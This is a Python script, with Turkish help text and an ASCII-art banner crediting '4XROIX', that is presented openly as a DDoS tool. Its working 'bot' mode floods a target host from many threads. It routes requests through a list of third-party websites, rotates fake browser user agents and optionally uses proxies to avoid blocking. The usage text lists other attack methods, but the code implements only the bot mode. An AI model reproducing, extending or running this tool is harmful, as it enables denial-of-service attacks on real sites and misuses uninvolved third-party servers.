#!/usr/bin/env python3
# -*- coding:UTF-8 -*-
import random
import os
import socket
from argparse import ArgumentParser, HelpFormatter
from threading import Thread
from requests import get
from random import choice,randint
from time import sleep
from datetime import datetime
print("""

  ``   ``  ``   ``  ``   ``  ``  `````............-------------...`  ``  ``   ``  ``   ``  ``   ``  
``   ``  ``  ``   ``  ``   ````..-....................-------::::////:-.`   ``  ``   ``  ``  ``   ``
  ``   ``  ``   ``  ``   `.-----........................------::::////+++/:.  ``  ``   ``  ``   ``  
``   ``  ``  ``   ``  ``-::----...........`.``...........-----:::://///+++ooo-  ``   `   ``  ``   ``
   `   ``  ``   `   ``-:::-------.......`````````........------:::://+++++ooos:`   `   `   ``   `   
                     -::::::--..........````````............------::://++o+oos+                     
``   `   ``   `   `` :::::-.......`````..``````.............--/+oosssso+/+oooso ``   `   ``   `   ``
  ``   ``  ``   ``  `/:::/syhdddhys+:-.```..```.........-:oydhhdddhyyyyhhyoooos`  ``   ``  ``   ``  
``   ``  ``  ``   `` //+ys+///+osssso+::/-``.````.....:sdmmNmho/:---::://+ssoos```   ``  ``  ``   ``
  ``   ``  ``   ``  .///--....`````---sdmmy.```````./hmmmhs+:-.....---:://++oos.  ``   ``  ``   ``  
``   ``  ``  ``   ``-/:--....``   ``..-/shs-```````.ymho/:........`.--:://++oos-``   ``  ``  ``   ``
  ``   ``  ``   ``  :/:-....``````.........``    ``.-:::.........----::::/++oos:  ``   ``  ``   ``  
``   ``  ``  ``   ``//:-....................`    ``-:::.....--------:::://++oos:``   ``  ``  ``   ``
  ``   ``  ``   ``  //:--......````.........`    `.-::--.....`` ````.:::/++oooo/  ``   ``  ``   ``  
``   `   ``   `   ``+:::----`  ``   `` `..```    `.-:::-.```  ``   `` -//++++oo+``   `   ``   `   ``
                   `/:----..``      ```````.`   ``.-::::-...```````.-:::///++ooo                    
   `   `    `   `  `/:---...........``.``.```````..-:::::---..--------::://++oss   `   `    `   `   
``   `   ``   `   ``/:--..................`````...--::::::---...------:::///++oy``   `   ``  ``   ``
  ``   ``  ``   ``  :-..----....`````.....`````...--::::::---..------::://///+oy  ``   ``  ``   ``  
``   ``  ``  ``   ``:-------..``` `````...``````..--::::::-------.---:://///+os+``   ``  ``  ``   ``
  ``   ``  ``   ``  -:-::----.``      `..````````..-:::::::::-------::///+++osy.  ``   ``  ``   ``  
``   ``  ``  ``   ```+::::---...```....``````  ```.-::::::://::----:::///++osso ``   ``  ``  ``   ``
  ``   ``  ``   ``  `//::----.....--...`````    ```.-::::::://::::::://++oo+oy:`  ``   ``  ``   ``  
``   ``  ``  ``   `` -+---:/:----..........``   ``.-::://///:::::::://ydo/:+ss  ``   ``  ``  ``   ``
  ``   ``  ``   ``  ``+/..:mh-......``..--....``..-://////:::::::::::yNy+:/sy:``  ``   ``  ``   ``  
``   `   ``   `   ``  -/:..:my-...```````.`./yssosyhdo::-------::::+hmy+//oss`  ``   `   ``   `   ``
                      `+/-..:dmo-.``````../ohhhhsymmddyo:-----::/ohmdo++/osy-                       
   `   ``  ``   `   `` ://-..-ommhso++ooshhhyhs:--/dmmdddhyysyhdmmhs+++/oss+  ``   `   ``  ``   `   
``   `   ``   `   ``  ``:/::...-:oyyhdddddhhy+-...-:sdddddddhyso+//++//oss/```  ``   `   ``  ``   ``
  ``   ``  ``   ``  ``  `::::.`.--....--:ossssooooosssyss/::::::/+++//oso-`   ``  ``   ``  ``   ``  
``   ``  ``  ``   ``  ``  -:::-..-:-....````...........----::/++++/:+ss+`   ``  ``   ``  ``  ``   ``
  ``   ``  ``   ``  ``   ```:/::-.-------...........---::///+++++:/oso-  ``   ``  ``   ``  ``   ``  
``   ``  ``  ``   ``  ``   ```::::.-----....-/hhhdddd+::::///+++/+oo/  ``   ``  ``   ``  ``  ``   ``
  ``   ``  ``   ``  ``   ``  ```-::-----......hmNNNNy/::::://+/+oo+. ``  ``   ``  ``   ``  ``   ``  
``   ``  ``  ``   ``  ``   ``  ``.-::---..```.ommNmms:---::/+++oo- ``  ``   ``  ``   `   ``  ``   ``
  ``   ``  ``   ``  ``   `   ``   `.-:---..``.+mmmmms:---:/++oo/``   ``   `   ``  ``   ``  ``   ``  
                                    `.---...../mmmmms:--:/++o/.`                                    
``   `   ``   `   ``   `   `    `   ` `.:--...:NNNNNs/:::/++-  `   `    `   `   ``   `   ``   `   ``
  ``   ``  ``   ``  ``   `   ``   `   ```-:----dNNNNo/:/++- ``   `   ``   `   ``  ``   ``  ``   ``  
``   ``  ``  ``   ``  ``   ``  ``   ``  ```--::oNNNNs++/. ``  ``   ``  ``   ``  ``   ``  ``  ``   ``
  ``   ``  ``   ``  ``   ``  ``  ``   ``  ``  `.omh:`   ``  ``   ``  ``  ``   ``  ``   ``  ``   ``  
``   ``  ``  ``   ``  ``   ``  ``   ``  ``   ``  ``  ``   ``  ``   ``  ``   ``  ``   ``  ``  ``   ``
                                      .::CRACTED BY 4XROIX::.
""")
def NewUsage(name=None):
    return """AxroixDDos.py [-h]
        [--method [axroix/http_flood/bot] ]
        [--threads [sayi] ]
        [--ip [IP adresi] ]
        [--port [Port numarasi] ]
    """
def ParseArgs():
    parser = ArgumentParser(description="Gelismis DDos yazilimim Yapimci : axroix",usage =NewUsage())
    parser._optionals.title = "Kullanilabilir Argumanlar"
    parser.add_argument("--method",help="Saldiri methodunu belirler.",type=str)
    parser.add_argument("--threads",help="Saldirida kullanilacak cekirdek sayisini belirler.",type=int)
    parser.add_argument("--ip",help="Saldirilacak ip adresini belirler.",type=str)
    parser.add_argument("--port",help="Kullanilacak port numarasini belirler",type=int)
    parser.add_argument("--socket",help="Acilacak socket sayisini belirler.",type=int)
    parser.add_argument("--useproxy",action="store_true",help="Bot saldirisinda proxy belirler.")
    parser.set_defaults(useproxy=False)
    parser.set_defaults(threads=1)
    parser.set_defaults(socket=50)
    args = parser.parse_args()
    if (args.method == None):
        print(parser.print_help())
        exit(0)
    return args
USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]
def print_error(msg):
    t = datetime.now().strftime("%H:%M:%S")
    print("[" + t + "] [HATA] " + msg)
def print_status(msg):
    t = datetime.now().strftime("%H:%M:%S")
    print("[" + t + "] [OK]   " + msg)
class BOT:
    def __init__(self, ip=None, site=None, proxy=None):
        if (ip != None):
            self.host = "http://" + ip
        else:
            self.host = "http://" + site
        self.run = False
        self.requestnumber = 0
        self.threads = []
        self.proxy = proxy
        self.sleep1min = False
        with open("./botsiteler.txt") as file:
            self.websiteler = file.readlines()
    def Saldiri(self):
        self.run = True
        while (self.run):
            for website in self.websiteler:
                website = website.replace("\r","")
                website = website.replace("\n","")
                res = None
                currentproxy = None
                if (self.proxy != None):
                    try:
                        currentproxy = choice(self.proxy).replace("\n","").replace("\r","")
                        res = get(website + self.host, headers= {
                            "User-Agent": choice(USER_AGENTS)
                        }, proxies={"http": "http://" + currentproxy})
                    except:
                        print_error(currentproxy + "Proxyisi scalismiyor")
                        continue
                else:
                    res= get(website + self.host, headers= {
                        "User-Agent": choice(USER_AGENTS)
                    })
                if (res == None):
                    pass
                elif (res.status_code == 403):
                    print_error("Cok fazla request gonderildi icin engellenmis olabiliriz!")
                    continue
                else:
                    if (self.proxy != None):
                        print_error(currentproxy + "Proxyisi calismiyor!")
                    continue
    def SaldiriSayisiolustur(self,number):
        for _ in range(number):
            self.threads.append(
                Thread(target=self.Saldiri).start()
            )
    def Stop(self):
        self.run = False
def main():
    args = ParseArgs()
    if (args.method == "bot"):
        if (args.threads == None):
            print_error("Bot saldirisinda cekirdek sayisi belirlenmektedir.")
            exit(0)
        proxies = []
        with open('./proxyler.txt') as f:
            for proxy in f.readlines():
                proxies.append(proxy.replace("\r",""))
        bot = None

        if (args.useproxy == False):
            bot = BOT(ip=args.ip, site=args.ip)
        else:
            bot = BOT(ip=args.ip, site=args.ip, proxy=proxies)
        print_status("Bot saldirisi icin " + str(args.threads) + "Adet cekirdek sayisi aciliyor...")
        bot.SaldiriSayisiolustur(args.threads)

        print_status("Bot saldirisi baslatildi...")
if __name__ == "__main__":
    main()